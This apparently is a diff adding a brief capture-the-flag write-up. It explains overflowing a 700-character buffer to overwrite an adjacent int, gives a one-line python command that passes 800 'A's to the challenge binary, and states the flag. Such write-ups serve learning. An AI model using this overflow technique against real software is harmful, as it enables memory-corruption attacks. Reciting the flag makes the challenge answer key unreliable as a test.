@@ -1,0 +1,6 @@
+There's a 700-character buffer and an int right above that.
+If we overflow from the buffer, we can write to the int.
+We need to set the int to a number greater than 12.
+$ ./aplit $(python -c "print 'A'*800")
+
+easyctf{essays_are_too_hard}
